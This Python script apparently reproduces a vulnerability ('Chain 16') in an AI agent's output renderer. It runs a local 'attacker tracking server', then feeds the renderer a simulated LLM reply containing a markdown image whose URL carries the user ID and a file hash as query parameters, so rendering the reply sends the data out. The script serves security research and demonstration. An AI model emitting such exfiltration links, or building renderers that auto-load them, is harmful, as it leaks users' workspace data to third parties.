import subprocess
import time
import sys
from pathlib import Path

BASE_DIR = Path(__file__).resolve().parent
if str(BASE_DIR) not in sys.path:
    sys.path.insert(0, str(BASE_DIR))

from vulnerable_renderer_simulator import render_content_stream

def run_scenario():
    print("=== Chain 16 复现: 未授权 Web 请求与元数据外泄 ===\n")
    
    # 1. 启动恶意追踪服务器
    print("[1] 启动攻击者追踪服务器 (Port 8081)...")
    server_proc = subprocess.Popen(
        [sys.executable, str(BASE_DIR / "malicious_server.py")],
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True,
        bufsize=1
    )
    time.sleep(2)
    
    try:
        # 2. 模拟 LLM 生成恶意响应
        # 攻击者目标：诱导 LLM 将当前工作区文件的 Hash 和 用户 ID 发送出去
        print("\n[2] 模拟 LLM 响应生成 (包含恶意 Markdown)...")
        
        # 假设 Agent 上下文中有这些数据
        workspace_context = {
            "current_user": "admin_007",
            "file_hash": "e10adc3949ba59abbe56e057f20f883e"
        }
        
        # 构造响应 Payload
        llm_response = (
            "已为您生成文件审计摘要。\n"
            "可视化图表正在加载中...\n"
            f"![loading](http://localhost:8081/track?user_id={workspace_context['current_user']}&file_hash={workspace_context['file_hash']})"
        )
        
        print(f"    [LLM Output]: {llm_response}")
        
        # 3. 触发渲染器 (漏洞点)
        print("\n[3] 用户查看到消息 -> Output Renderer 自动执行...")
        render_content_stream(llm_response)
        
        # 4. 检查服务器日志
        print("\n[4] 检查攻击者服务器捕获的请求...")
        time.sleep(1)
        
    except Exception as e:
        print(f"Error: {e}")
    finally:
        # 确保进程已关闭并收集日志
        if server_proc.poll() is None:
            server_proc.terminate()
            try:
                outs, errs = server_proc.communicate(timeout=2)
            except subprocess.TimeoutExpired:
                server_proc.kill()
                outs, errs = server_proc.communicate()
        else:
            outs, errs = server_proc.communicate()

        print("--- 捕获日志 ---")
        if outs:
            print(outs)
        if errs:
            print(errs)

if __name__ == "__main__":
    run_scenario()
